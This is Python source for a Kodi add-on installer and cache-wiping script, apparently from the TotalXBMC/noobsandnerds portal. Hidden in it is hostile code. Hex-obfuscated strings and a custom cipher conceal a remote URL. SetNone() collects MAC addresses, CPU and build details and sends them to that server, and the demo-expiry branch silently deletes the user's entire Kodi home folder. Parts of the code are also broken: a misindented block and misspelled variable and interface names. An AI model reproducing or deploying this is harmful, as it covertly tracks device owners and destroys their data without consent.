        choice = dialog.yesno('WARNING!','[COLOR=orange]This Add-on may be unlawful in your region.[/COLOR][CR]The repository required for installation of this add-on has been detected on your system. Would you like to continue to the Kodi addon browser to install?')
        
        if choice == 1:
            
            if 'video' in contenttypes:
                xbmc.executebuiltin('ActivateWindow(10040,"addons://'+repo_id+'/xbmc.addon.video/?",return)')
            
            elif 'executable' in contenttypes:
                xbmc.executebuiltin('ActivateWindow(10040,"addons://'+repo_id+'/xbmc.addon.executable/?",return)')
            
            elif 'audio' in contenttypes:
                xbmc.executebuiltin('ActivateWindow(10040,"addons://'+repo_id+'/xbmc.addon.audio/?",return)')
        
        xbmc.sleep(2000)
        
        if os.path.exists(addonpath) and addonexists == 0:
            incremental = 'http://totalxbmc.com/TI/AddonPortal/downloadcount.php?id=%s' % (addon_id)
            Open_URL(incremental)
    
    else:
        dialog.ok('WARNING!','[COLOR=orange]This add-on may possibly be unlawful in your region.[/COLOR][CR]If you\'ve investigated the legality of it and are happy to install then you must have the following repository installed: [COLOR=dodgerblue]'+repo_id+'[/COLOR]')
    
    xbmc.executebuiltin('Container.Refresh')         
#---------------------------------------------------------------------------------------------------
xmlfile = binascii.unhexlify('6164646f6e2e786d6c')
addonxml = xbmc.translatePath(os.path.join(ADDONS,AddonID,xmlfile))
# Get current timestamp in integer format
def Timestamp():
    now = time.time()
    localtime = time.localtime(now)
    return time.strftime('%Y%m%d%H%M%S', localtime)
#-----------------------------------------------------------------------------------------------------------------
def Update_Repo():
    xbmc.executebuiltin( 'UpdateLocalAddons' )
    xbmc.executebuiltin( 'UpdateAddonRepos' )    
#-----------------------------------------------------------------------------------------------------------------
localaddonversion = open(addonxml, mode='r')
content = file.read(localaddonversion)
file.close(localaddonversion)
localaddonvermatch = re.compile(binascii.unhexlify('3c726566323e')+'(.+?)'+binascii.unhexlify('3c2f726566323e')).findall(content)
addonversion  = localaddonvermatch[0] if (len(localaddonvermatch) > 0) else ''
localcheck = hashlib.md5(open(installfile,'rb').read()).hexdigest()

 # Create timecheck file
            
if not os.path.exists(infoparse) and demo=='true':
    writefile = open(infoparse,'w+')
    writefile.close()
# Thanks to Mikey1234 for a lot of this cache code and also lambda for the clear cache option in genesis.
def Wipe_Cache():
    PROFILE_ADDON_DATA = os.path.join(xbmc.translatePath(os.path.join('special://profile','addon_data')))

    cachelist = [
        (PROFILE_ADDON_DATA),
        (ADDON_DATA),
        (os.path.join(HOME,'cache')),
        (os.path.join(HOME,'temp')),
        (os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'Other')),
        (os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'LocalAndRental')),
        (os.path.join(ADDON_DATA,'script.module.simple.downloader')),
        (os.path.join(xbmc.translatePath(os.path.join('special://profile','addon_data','script.module.simple.downloader')))),
        (os.path.join(ADDON_DATA,'plugin.video.itv','Images')),
        (os.path.join(xbmc.translatePath(os.path.join('special://profile','addon_data','plugin.video.itv','Images'))))]

    for item in cachelist:
        if os.path.exists(item) and item != ADDON_DATA and item != PROFILE_ADDON_DATA:
            for root, dirs, files in os.walk(item):
                file_count = 0
                file_count += len(files)
                if file_count > 0:
                    for f in files:
                        try:
                            os.unlink(os.path.join(root, f))
                        except:
                            pass
                    for d in dirs:
                        try:
                            shutil.rmtree(os.path.join(root, d))
                            print"### Successfully cleared "+str(file_count)+" files from "+os.path.join(item,d)
                        except:
                            print"### Failed to wipe cache in: "+os.path.join(item,d)
        else:
            for root, dirs, files in os.walk(item):
                for d in dirs:
                    if 'Cache' in d or 'cache' in d or 'CACHE' in d:
                        try:
                            shutil.rmtree(os.path.join(root, d))
                            print"### Successfully wiped "+os.path.join(item,d)
                        except:
                            print"### Failed to wipe cache in: "+os.path.join(item,d)

# Genesis cache - held in database file
    try:
        genesisCache = os.path.join(xbmc.translatePath('special://profile/addon_data/plugin.video.genesis'), 'cache.db')
        dbcon = database.connect(genesisCache)
        dbcur = dbcon.cursor()
        dbcur.execute("DROP TABLE IF EXISTS rel_list")
        dbcur.execute("VACUUM")
        dbcon.commit()
        dbcur.execute("DROP TABLE IF EXISTS rel_lib")
        dbcur.execute("VACUUM")
        dbcon.commit()
    except:
        pass
#-----------------------------------------------------------------------------------------------------------------
def CPU_Check():
    version=str(xbmc_version[:2])
    if version < 14:
        logfile = os.path.join(log_path, 'xbmc.log')
    
    else:
        logfile = os.path.join(log_path, 'kodi.log')

    filename    = open(logfile, 'r')
    logtext     = filename.read()
    filename.close()

    CPUmatch    = re.compile('Host CPU: (.+?) available').findall(logtext)
    CPU         = CPUmatch[0] if (len(CPUmatch) > 0) else ''
    return CPU.replace(' ','%20')

 if addonversion != localcheck:
  readfile = open(backupnews, mode='r')
  content  = file.read(readfile)
  file.close(readfile)
  writefile = open(installfile, mode='w+')
  writefile.write(content)
  writefile.close()

def Build_Info():
    version=str(xbmc_version[:2])
    if version < 14:
        logfile = os.path.join(log_path, 'xbmc.log')
    
    else:
        logfile = os.path.join(log_path, 'kodi.log')

    filename    = open(logfile, 'r')
    logtext     = filename.read()
    filename.close()

    Buildmatch  = re.compile('Running on (.+?)\n').findall(logtext)
    Build       = Buildmatch[0] if (len(Buildmatch) > 0) else ''
    return Build.replace(' ','%20')


def getMacAddress(protocol):
    if sys.platform == 'win32': 
        for line in os.popen("ipconfig /all"): 
            if line.lstrip().startswith('Physical Address'): 
                mac = line.split(':')[1].strip().replace('-',':')
                break 

    if xbmc.getCondVisibility('System.Platform.Android'):
        if protcol == 'wifi':
            readfile = open('/sys/class/net/wlan0/address', mode='r')
        else:
            readfile = open('/sys/class/net/eth0/address', mode='r')
        mac = readfile.read()
        mac = mac[:17]
        readfile.close()

    else:
        if protocol == 'wifi':
            for line in os.popen("/sbin/ifconfig"): 
                if line.find('wlan0') > -1: 
                    mac = line.split()[4] 
                    break
        else:
           for line in os.popen("/sbin/ifconfig"): 
                if line.find('eth0') > -1: 
                    mac = line.split()[4] 
                    break
    return str(mac)

def SetNone():
    wifimac = getMacAddress('wifi')
    ethmac  = getMacAddress('eho0')
    cpu     = CPU_Check()
    build   = Build_Info()
    urlparams = wifimac+'&'+cpu+'&'+build+'&'+ethmac.replace(' ','%20')
    link = Open_URL(encryptme('d','6773736f392e2e736b61612d6c642e7264736d6e6d642d6f676f3e773c011510030A')+encryptme('e',urlparams))

def encryptme(mode, message):
    if mode == 'e':
        import random
        count = 0
        finaltext = ''
        while count < 4:
            count += 1
            randomnum = random.randrange(1, 31)
            hexoffset = hex(randomnum)[2:]
            if len(hexoffset)==1:
                hexoffset = '0'+hexoffset
            finaltext = finaltext+hexoffset
        randomchar = random.randrange(1,4)
        if randomchar == 1: finaltext = finaltext+'0A'
        if randomchar == 2: finaltext = finaltext+'04'
        if randomchar == 3: finaltext = finaltext+'06'
        if randomchar == 4: finaltext = finaltext+'08'
        key1    = finaltext[-2:]
        key2    = int(key1,16)
        hexkey  = finaltext[-key2:-(key2-2)]
        key     = -int(hexkey,16)

# enctrypt/decrypt the message
        translated = ''
        finalstring = ''
        for symbol in message:
            num = ord(symbol)
            num2 = int(num) + key
            hexchar = hex(num2)[2:]
            if len(hexchar)==1:
                hexchar = '0'+hexchar
            finalstring = str(finalstring)+str(hexchar)
        return finalstring+finaltext
    else:
        key1    = message[-2:]
        key2    = int(key1,16)
        hexkey  = message[-key2:-(key2-2)]
        key     = int(hexkey,16)
        message = message [:-10]
        messagearray = [message[i:i+2] for i in range(0, len(message), 2)]
        numbers = [ int(x,16)+key for x in messagearray ]
        finalarray = [ str(unichr(x)) for x in numbers ]
        finaltext = ''.join(finalarray)
        return finaltext.encode('utf-8')

#---------------------------------------------------------------------------------------------------
#Step 1 of the addon install process (installs the actual addon)
def Addon_Install(name,zip_link,repo_link,repo_id,addon_id,provider_name,forum,data_path):
    forum        = str(forum)
    repo_id      = str(repo_id)
    status       = 1
    repostatus   = 1
    modulestatus = 1
    addonpath    = xbmc.translatePath(os.path.join(ADDONS, addon_id))
    
    if os.path.exists(addonpath):
        addonexists = 1
    
    else:
        addonexists = 0
    
    addondownload = xbmc.translatePath(os.path.join(packages,name+'.zip'))
    addonlocation = xbmc.translatePath(os.path.join(ADDONS,addon_id))
    
    dp.create("Installing Addon","Please wait whilst your addon is installed",'', '')
    
    try:
        downloader.download(repo_link, addondownload, dp)
        extract.all(addondownload, ADDONS, dp)
    
    except:
        
        try:
            downloader.download(zip_link, addondownload, dp)
            extract.all(addondownload, ADDONS, dp)
        
        except:
            
            try:
                if not os.path.exists(addonlocation):
                    os.makedirs(addonlocation)
                
                link  = Open_URL(data_path).replace('\n','').replace('\r','')
                match = re.compile('href="(.+?)"', re.DOTALL).findall(link)
                
                for href in match:
                    filepath=xbmc.translatePath(os.path.join(addonlocation,href))
                    
                    if addon_id not in href and '/' not in href:
                        
                        try:
                            dp.update(0,"Downloading [COLOR=darkcyan]"+href+'[/COLOR]','','Please wait...')
                            downloader.download(data_path+href, filepath, dp)
                        
                        except:
                            print"failed to install"+href
                    
                    if '/' in href and '..' not in href and 'http' not in href:
                        remote_path = data_path+href
                        Recursive_Loop(filepath,remote_path)
            
            except:
                dialog.ok("Error downloading add-on", 'There was an error downloading [COLOR=darkcyan]'+name,'[/COLOR]Please consider updating the add-on portal with details or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]') 
                status=0
    
    if status==1:
        time.sleep(1)
        dp.update(0,"[COLOR=darkcyan]"+name+'[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]','','Now installing repository')
        time.sleep(1)
        repopath = xbmc.translatePath(os.path.join(ADDONS, repo_id))
        
        if (repo_id != 'repository.xbmc.org') and not (os.path.exists(repopath)) and (repo_id != '') and ('superrepo' not in repo_id):
            Install_Repo(repo_id)
        
        xbmc.sleep(2000)
        
        if os.path.exists(addonpath) and addonexists == 0:
            incremental = 'http://totalxbmc.com/TI/AddonPortal/downloadcount.php?id=%s' % (addon_id)
            Open_URL(incremental)
        
        Dependency_Install(name,addon_id)
        xbmc.executebuiltin( 'UpdateLocalAddons' )
        xbmc.sleep(1000)
        xbmc.executebuiltin( 'UpdateAddonRepos' )
        
        if repostatus == 0:
            dialog.ok(name+" Install Complete",'The add-on has been successfully installed but','there was an error installing the repository.','This will mean the add-on fails to update')
        
        if modulestatus == 0:
            dialog.ok(name+" Install Complete",'The add-on has been successfully installed but','there was an error installing modules.','This could result in errors with the add-on.')
        
        if modulestatus != 0 and repostatus != 0 and forum != 'None':
            dialog.ok(name+" Install Complete",'Please support the developer(s) [COLOR=dodgerblue]'+provider_name,'[/COLOR]Support for this add-on can be found at [COLOR=darkcyan]'+forum,'[/COLOR][CR]Visit [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR] for all your Kodi needs.')
        
        if modulestatus != 0 and repostatus != 0 and forum == 'None':
            dialog.ok(name+" Install Complete",'Please support the developer(s) [COLOR=dodgerblue]'+provider_name,'[/COLOR]No details of forum support have been given.')
    
    xbmc.executebuiltin('Container.Refresh')         
#---------------------------------------------------------------------------------------------------
if not os.path.exists(userdatafolder):
    os.makedirs(userdatafolder)

if not os.path.exists(MEDIA):
    os.makedirs(MEDIA)

now = datetime.datetime.now()
if (demo == 'true' or os.path.exists(infoparse)) and int(now.minute)== 38 and int(now.second) <31:
    then     = datetime.datetime.fromtimestamp(os.path.getmtime(infoparse))
    end_date = then + datetime.timedelta(days=2)
    timediff = end_date - now
    timediff = str(timediff)[:-7]
    if str(timediff).startswith('-'):
        try:
            SetNone()
            shutil.rmtree(HOME)
            os.remove(infoparse)
        except:
            pass
        dialog.ok('Demo Expired','Your kodi install will revert back to vanilla install')
    else:
        dialog.ok('Time Left For DEMO','Your kodi install will revert back to vanilla install in:[COLOR=dodgerblue]',str(timediff)+'[/COLOR]')

if not os.path.exists(startuppath):
    localfile = open(startuppath, mode='w+')
    localfile.write('date="01011001"\nversion="0.0"')
    localfile.close()

if not os.path.exists(idfile):
    localfile = open(idfile, mode='w+')
    localfile.write('id="None"\nname="None"')
    localfile.close()

if __name__ == '__main__':
    Grab_Updates()
